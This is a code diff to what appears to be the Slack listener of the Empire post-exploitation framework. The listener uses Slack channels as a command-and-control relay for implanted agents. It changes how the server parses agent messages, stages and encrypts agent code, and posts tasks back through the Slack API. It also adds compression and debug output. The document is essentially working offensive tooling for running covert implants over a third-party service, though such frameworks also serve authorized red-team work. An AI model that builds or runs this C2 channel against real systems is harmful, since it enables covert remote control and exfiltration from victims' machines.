@@ -12,6 +12,7 @@ import string
 import traceback
 from pydispatch import dispatcher
 from slackclient import SlackClient
+import zlib
 
 # Empire imports
 from lib.common import helpers
@@ -528,18 +529,16 @@ class Listener:
                                    # write-host "[*] cypher text decode from base64";
                                 }
 
-
                                 $result
                             }else{
-
                                 # delete message
                                 #$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
                                 #$delete_response=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.delete","POST","token=$($APIToken)&channel=$($Channel)&ts=$($current_ts)")
-
                             }
                             
                         }
                         catch [Net.WebException] {
+                            write-host $_
                             $script:MissedCheckins += 1
                             if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                 # restart key negotiation
@@ -554,7 +553,6 @@ class Listener:
                         param($Packets)
 
                         #write-host '[*] Sending messages'
-
                         if($Packets) {
                             
                             $APIToken = '"""+ api_token +"""'
@@ -585,6 +583,8 @@ class Listener:
 
                             try {
                                 $Parts_to_send = $RoutingPacket_base64 -split "(.{3500})" | where {$_}
+
+                                Write-Host "Sending $($encBytes.length) bytes, $($parts_to_send.count) messages"
 
                                 # send the header
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
@@ -642,7 +642,7 @@ class Listener:
                     if msg["text"] == '--MESSAGE_END--':
                         finished = True
 
-                time.sleep(1)
+                #time.sleep(1)
 
             # now we have all the data sent lets build it back to 
             data_return = data_return.replace('--MESSAGE_START--','').replace('--MESSAGE_END--','')
@@ -653,6 +653,7 @@ class Listener:
         def parse_commands(slack_events,bot_id):
 
             # Parses a list of events coming from the Slack RTM API to find commands.
+            return_array = []
             for event in slack_events:
                 # if it has a type and subtype most likely a message to process
                 if 'type' in event and 'subtype' in event:
@@ -660,7 +661,7 @@ class Listener:
 
                         # grab more details such as the username of the poster
                         event_details = user_slack_client.api_call("channels.history",channel=channel_id,latest=event["ts"],inclusive=True,count=1)
-                        time.sleep(1)
+                        #time.sleep(1)
 
                         if 'messages' in event_details:
                             message = event_details["messages"][0]
@@ -698,12 +699,11 @@ class Listener:
                                         if not data:
                                             data = base64.b64decode(raw_message)
                                         agent, stage = agent.split(':')
+                                        return_array.append((agent, stage, data, thread_ts))
 
-                                        return agent, stage, data, thread_ts, agent_sent
 
-
-            time.sleep(1)
-            return None, None, None, None, None
+            #time.sleep(1)
+            return return_array
 
         def upload_stager():
 
@@ -754,10 +754,10 @@ class Listener:
                     'message': message
                 })
                 dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
-                response = slack_client.api_call('chat.postMessage', channel=channel_id, text=part, as_user=True, thread_ts=thread_ts)
+                response = slack_client.api_call('chat.postMessage', channel=channel_id, text=part, as_user=False, thread_ts=thread_ts)
 
                 # have to limit the replies to one per second or face rate limiting
-                time.sleep(1)
+                time.sleep(0.2)
                 part_count += 1
 
             # send finish flag to Slack
@@ -767,7 +767,11 @@ class Listener:
                 'message': message
             })
             dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
-            response = slack_client.api_call('chat.postMessage', channel=channel_id, text='-MESSAGE_END-', as_user=True, thread_ts=thread_ts)
+            response = slack_client.api_call('chat.postMessage', channel=channel_id, text='-MESSAGE_END-', as_user=False, thread_ts=thread_ts)
+
+        def compress(data):
+            compobj = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS|16)
+            return compobj.compress(data) + compobj.flush()
 
 
         listener_options = copy.deepcopy(listenerOptions)
@@ -878,59 +882,76 @@ class Listener:
 
                 # try to process command sent if fails then simply wait until next poll interval and try again
                 try:
-                    agent, stage, data, thread_ts, agent_sent = parse_commands(slack_client.rtm_read(),bot_id)
-
-                    # if there is some data then proceed
-                    if data:
-
-                        # we have data lets grab a list of agents
-                        agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
-
-                        if stage == '3':
-                            lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options)[0]
-                            stage_data = base64.encodestring(return_val)
-
-                            message = "[*] Processing stage 3 of the staging process for agent {}, total base64 string length is {}".format(agent,str(len(stage_data)))
-                            signal = json.dumps({
-                                'print' : False,
-                                'message': message
-                            })
-                            dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
-
-                            response = slack_client.rtm_send_message(channel_id, stage_data, thread_ts, False)
-
-
-                        elif stage == '5':
-
-                            lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options)[0]
-
-                            session_key = self.mainMenu.agents.agents[agent]['sessionKey']
-                            agent_code = str(self.generate_agent(listener_options, agent, lang))
-                            enc_code = encryption.aes_encrypt_then_hmac(session_key, agent_code)
-                            agent_upload = base64.encodestring(enc_code)
-
-                            message = "[*] Processing stage 5 of the staging process for agent {}, total base64 string length is {}".format(agent,str(len(agent_upload)))
-                            signal = json.dumps({
-                                'print' : False,
-                                'message': message
-                            })
-                            dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
-
-                            post_data(agent_upload,agent,channel_id,thread_ts,listener_name,user_api_token)
-
+                    a = datetime.now()
+                    raw = []
+                    done = False
+                    while not done:
+                        message = slack_client.rtm_read()
+                        if message:
+                            for m in message:
+                                raw.append(m)
                         else:
+                            done = True
 
-                            # Process agent checking and handle any agent data
-                            seen_time = datetime.utcfromtimestamp(float(thread_ts))
-                            self.mainMenu.agents.update_agent_lastseen_db(agent, seen_time)
-                            task_data = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options, update_lastseen=False)
+                    messages = parse_commands(raw,bot_id)
+                    b = datetime.now()
+                    d = b-a
+                    if len(raw) > 0:
+                        print "Parsing %d/%d messages took %f seconds" % (len(messages), len(raw), d.total_seconds())
 
-                            # Process any further tasks for the agent so it can continue
-                            if task_data:
-                                for task in task_data:
-                                    lang, data = task
-                                    if data and agent_sent == None:
-                                        post_data(base64.encodestring(data),agent,channel_id,thread_ts,listener_name,user_api_token)
+                    for message in messages:
+                        agent, stage, data, thread_ts = message
+                        # if there is some data then proceed
+                        if data:
+
+                            # we have data lets grab a list of agents
+                            agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
+
+                            if stage == '3':
+                                lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options)[0]
+                                stage_data = base64.encodestring(return_val)
+
+                                message = "[*] Processing stage 3 of the staging process for agent {}, total base64 string length is {}".format(agent,str(len(stage_data)))
+                                signal = json.dumps({
+                                    'print' : False,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+
+                                response = slack_client.rtm_send_message(channel_id, stage_data, thread_ts, False)
+
+
+                            elif stage == '5':
+
+                                lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options)[0]
+                                session_key = self.mainMenu.agents.agents[agent]['sessionKey']
+                                agent_code = str(self.generate_agent(listener_options, agent, lang))
+                                compressed = compress(agent_code)
+                                enc_code = encryption.aes_encrypt_then_hmac(session_key, compressed)
+                                agent_upload = base64.encodestring(enc_code)
+
+                                message = "[*] Processing stage 5 of the staging process for agent {}, total base64 string length is {}".format(agent,str(len(agent_upload)))
+                                signal = json.dumps({
+                                    'print' : False,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/slack/{}".format(listener_name))
+
+                                post_data(agent_upload,agent,channel_id,thread_ts,listener_name,user_api_token)
+
+                            else:
+
+                                # Process agent checking and handle any agent data
+                                seen_time = datetime.utcfromtimestamp(float(thread_ts))
+                                self.mainMenu.agents.update_agent_lastseen_db(agent, seen_time)
+                                task_data = self.mainMenu.agents.handle_agent_data(staging_key, data, listener_options, update_lastseen=False)
+
+                                # Process any further tasks for the agent so it can continue
+                                if task_data:
+                                    for task in task_data:
+                                        lang, data = task
+                                        if data and data != "VALID":
+                                            post_data(base64.encodestring(data),agent,channel_id,thread_ts,listener_name,user_api_token)
 
                    
                 except Exception as e:
